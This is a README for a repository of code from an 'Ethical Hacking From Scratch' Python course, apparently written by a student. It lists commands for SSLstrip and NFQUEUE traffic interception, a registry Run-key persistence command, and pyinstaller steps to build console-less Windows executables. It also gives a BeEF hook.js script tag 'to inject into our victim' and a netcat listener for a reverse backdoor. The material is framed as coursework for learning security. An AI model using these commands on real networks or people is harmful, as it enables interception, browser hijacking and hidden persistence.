# Ethical Hacking Course
Repository for all the code related to Learn Python &amp; "Ethical Hacking From Scratch" course.  
All the work is done on Kali Linux, using both Python 2.7 and 3.x version.

## Requirements
Besides the needed libraries stated in *requirements.txt* file, BeEF framework for Kali Linux is required. Install it with the following command:  
`sudo apt-get install beef-xss`

If SSLstrip is not provided with your distribution of Kali Linux virtual machine, install it from the original source: [moxie0/sslstrip](https://github.com/moxie0/sslstrip "A tool for exploiting Moxie Marlinspike's SSL \"stripping\" attack.").

## Guidelines

### Operating system

#### Kali Linux
To enable **IP forwarding**, enter the following command into the terminal:  
`echo 1 > /proc/sys/net/ipv4/ip_forward`

To create **net filter queue** (*iptables*), enter the following command:  
`iptables -I FORWARD -j NFQUEUE --queue-num <number>`,  
where the default `<number>` is `0`.

For local testing, use both `INPUT` and `OUTPUT` chain.

To enable a basic HTTP server, type:  
`sudo service apache2 start`

#### Windows
To add an executable to Windows Registry to make the file run on the system start, the following command can be used:  
`reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <name_of_reg> /t REG_SZ /d <"path_to_exe">`  

### Python
You can terminate all running python programs by typing `killall python` in the terminal.  

On Windows, while having both Python 2 and 3 installed, we can force to run either version by running:  
`py -<version> <name_of_script_file>`  
where `<version>` can be '2' or '3'.

#### Packaging scripts into executables
In order to package Python scripts into executable files, you need to have "pyinstaller" installed
 and you have to run the following command:  
`pyinstaller <script_name.py> --onefile --noconsole`  
* You might need to use a path to pyinstaller instead, if it's not added to PATH.  
* `--onefile` argument ensures all the required libraries and files are put into **single** executable.  
* `--noconsole` argument disables console, so when we run the program, no terminal shows up. Please note that some
Python scripts may require "stdin", "stdout" and "stderr" to be handled properly (it is handled in our program).  
* The created executable can be found in the "dist" folder.  

If you need to create .exe file from a Linux machine (not recommended - it's better to do it natively),
you need a Python interpreter in it's Windows version. In order to do that, Wine is required
(should be installed by default on Kali Linux).  
After you've got both Python downloaded and Wine installed, type in the following command:  
`wine msiexec /i <python_installer_file>`  
* `msiexec` argument states that we are using a .msi file.  
* `/i` flag means that we want to install said file.  

After the Python installation has been completed, you can now run the interpreter in Windows version using:  
`wine python.exe -m pip install <library>` while in in `.wine/drive_c` and using `pyinstaller` as `<library>`.  
Just like on Windows, the pyinstaller can be found in `drive_c/PythonXX/Scripts` folder.  
Keep in mind that you need to have installed all the libraries your Python scripts use before you can package them.  
Similarly to Windows, in order to package the scripts, the following command needs to be typed in:  
`wine .wine/drive_c/PythonXX/Scripts/pyinstaller.exe <script_name.py> --onefile --noconsole`  
As you can see, this time we do type the whole path to `pyinstaller.exe`.  
<*I'm not sure if it's needed to, perhaps Wine can also simulate adding exe files to PATH.*>  
If you have multiple Python files used in your program, just remember to package the **main** file.
Pyinstaller will include imported libraries and files accordingly.  

### BeEF
The code we want to inject into our victim is:  
`<script src="http://<IP>:3000/hook.js"></script`,  
where `<IP>` is the IP of your host server containing *hook.js*.

If you are using a HTTP server, make sure insert the code snippet above
into */var/www/html/index.html*.

### SSLstrip
To use SSLstrip, use the following command to enable it in *iptables*:  
`iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000`

This makes so that all traffic coming to port 80, which is the default port of HTTP websites,
will instead be redirected to port 10000, which is the port the SSLstrip tool uses.

In order to use packet-modifying tools together with SSLstrip, they must be configured to watch
for port 10000 instead of 80 and commands below need to be entered into Linux shell:

`iptables -I INPUT -j NFQUEUE --queue-num <number>`  
`iptables -I OUTPUT -j NFQUEUE --queue-num <number>`

## Tips & Tricks
* It seems that *netfilterqueue* does not work on Python 3.x.  
* To listen to incoming connections without using custom listener for reverse_backdoor.py,
you can use `nc -vv -l -p <port_number>`.  


